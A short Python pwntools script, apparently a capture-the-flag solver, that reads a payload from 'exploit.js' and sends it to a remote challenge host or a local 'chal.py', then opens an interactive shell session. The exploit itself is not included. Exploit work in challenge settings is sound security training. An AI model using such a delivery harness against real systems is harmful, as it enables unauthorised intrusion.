from pwn import *

with open("exploit.js", "rb") as f:
    pl = f.read()
print(len(pl))

if args.REMOTE:
    io = remote("94.237.54.103", 51426)
else: 
    io = process(["python3", "chal.py"])

io.sendline(str(len(pl)).encode())
sleep(1)
io.sendlineafter(b'Script:\n', pl)

io.interactive()



